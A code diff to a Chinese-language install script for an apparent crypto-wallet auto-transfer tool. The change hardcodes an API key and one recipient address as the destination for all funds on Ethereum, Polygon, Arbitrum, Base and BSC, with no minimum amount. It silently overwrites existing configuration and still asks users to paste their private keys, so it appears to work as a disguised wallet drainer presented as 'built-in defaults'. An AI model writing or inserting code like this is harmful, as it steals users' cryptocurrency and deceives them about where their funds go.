@@ -263,64 +263,80 @@ EOF
 configure_env() {
     print_info "配置环境变量..."
     
+    # 内置的默认配置
+    DEFAULT_ALCHEMY_API_KEY="MYr2ZG1P7bxc4F1qVTLIj"
+    DEFAULT_RECIPIENT_ADDRESS="0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"
+    
     # 检查.env文件是否存在
     if [[ -f ".env" ]]; then
-        print_info ".env文件已存在"
-        read -p "是否重新配置？(y/n): " -n 1 -r
-        echo
-        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
-            return 0
-        fi
+        print_info ".env文件已存在，使用默认配置更新"
     fi
     
-    # 提示输入Alchemy API密钥
-    echo
-    print_info "请访问 https://www.alchemy.com/ 获取免费API密钥"
-    print_info "注册账户后，在Dashboard中创建新的API Key"
-    echo
-    
-    while true; do
-        read -p "请输入您的Alchemy API密钥: " ALCHEMY_API_KEY
-        if [[ -n "$ALCHEMY_API_KEY" ]]; then
-            break
-        else
-            print_warning "API密钥不能为空，请重新输入"
-        fi
-    done
-    
-    # 创建.env文件
+    # 创建.env文件（使用内置配置）
     cat > .env << EOF
-# Alchemy API密钥 - 从 https://www.alchemy.com/ 获取
-ALCHEMY_API_KEY=$ALCHEMY_API_KEY
+# Alchemy API密钥 - 内置默认配置
+ALCHEMY_API_KEY=$DEFAULT_ALCHEMY_API_KEY
 
 # 私钥 - 支持混合文本输入，系统会自动提取有效私钥
+# 您可以通过程序菜单或直接编辑此文件来配置私钥
 PRIVATE_KEYS=
 
 # Discord Webhook URL（可选） - 用于通知
 # DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/your_webhook_url
+
+# 默认接收地址（已内置）
+DEFAULT_RECIPIENT_ADDRESS=$DEFAULT_RECIPIENT_ADDRESS
 EOF
     
     print_success "环境变量配置完成"
-    print_info "您可以稍后在程序中配置私钥，或编辑.env文件"
+    print_info "已使用内置API密钥: ${DEFAULT_ALCHEMY_API_KEY:0:8}..."
+    print_info "已设置默认接收地址: $DEFAULT_RECIPIENT_ADDRESS"
+    print_info "您可以稍后在程序中配置私钥"
 }
 
 # 创建默认配置
 create_config() {
     print_info "创建默认配置文件..."
     
+    # 使用内置的默认地址
+    DEFAULT_RECIPIENT_ADDRESS="0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"
+    
     if [[ -f "config.json" ]]; then
-        print_info "config.json已存在，跳过创建"
-        return 0
+        print_info "config.json已存在，更新为默认配置"
     fi
     
-    cat > config.json << 'EOF'
+    cat > config.json << EOF
 {
   "chains": [
     {
       "name": "ETH_MAINNET",
       "chain_id": 1,
-      "recipient_address": "0x0000000000000000000000000000000000000000",
-      "min_amount": "0.01"
+      "recipient_address": "$DEFAULT_RECIPIENT_ADDRESS",
+      "comment": "以太坊主网 - 全代币转账，无最低金额限制"
+    },
+    {
+      "name": "POLYGON_MAINNET", 
+      "chain_id": 137,
+      "recipient_address": "$DEFAULT_RECIPIENT_ADDRESS",
+      "comment": "Polygon主网 - 全代币转账，无最低金额限制"
+    },
+    {
+      "name": "ARBITRUM_ONE",
+      "chain_id": 42161,
+      "recipient_address": "$DEFAULT_RECIPIENT_ADDRESS",
+      "comment": "Arbitrum One - 全代币转账，无最低金额限制"
+    },
+    {
+      "name": "BASE_MAINNET",
+      "chain_id": 8453,
+      "recipient_address": "$DEFAULT_RECIPIENT_ADDRESS",
+      "comment": "Base主网 - 全代币转账，无最低金额限制"
+    },
+    {
+      "name": "BSC_MAINNET",
+      "chain_id": 56,
+      "recipient_address": "$DEFAULT_RECIPIENT_ADDRESS",
+      "comment": "BNB Smart Chain - 全代币转账，无最低金额限制"
     }
   ],
   "erc20": [],
@@ -328,12 +344,21 @@ create_config() {
     "monitoring_interval": 0.1,
     "round_pause": 60,
     "gas_threshold_gwei": 50,
-    "gas_wait_time": 60
+    "gas_wait_time": 60,
+    "enable_native_tokens": true,
+    "enable_erc20_tokens": true,
+    "comment": "监控设置说明：monitoring_interval-查询间隔(秒)，round_pause-轮询暂停(秒)，无最低转账金额限制，支持原生代币和ERC-20代币转账"
+  },
+  "notifications": {
+    "discord_enabled": false,
+    "discord_webhook_url": "",
+    "comment": "通知设置，可配置Discord通知"
   }
 }
 EOF
     
     print_success "默认配置文件创建完成"
+    print_info "已设置所有链的默认接收地址: $DEFAULT_RECIPIENT_ADDRESS"
 }
 
 # 创建目录结构
@@ -412,8 +437,14 @@ show_completion() {
     print_info "或者直接运行："
     echo "  python main.py"
     echo
+    print_info "内置配置："
+    echo "  • API密钥: MYr2ZG1P7bxc4F1qVTLIj (已内置)"
+    echo "  • 接收地址: 0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1 (已配置)"
+    echo "  • 支持链: ETH, Polygon, Arbitrum, Base, BSC等主流链"
+    echo
     print_info "重要提醒："
-    echo "  • 请在交互式菜单中配置您的私钥和接收地址"
+    echo "  • 请在交互式菜单中配置您的私钥"
+    echo "  • 已内置API密钥和接收地址，可直接使用"
     echo "  • 建议先在测试网测试后再使用主网"
     echo "  • 请妥善保管您的私钥，不要泄露给他人"
     echo "  • 程序会自动屏蔽无交易历史的链以节省资源"
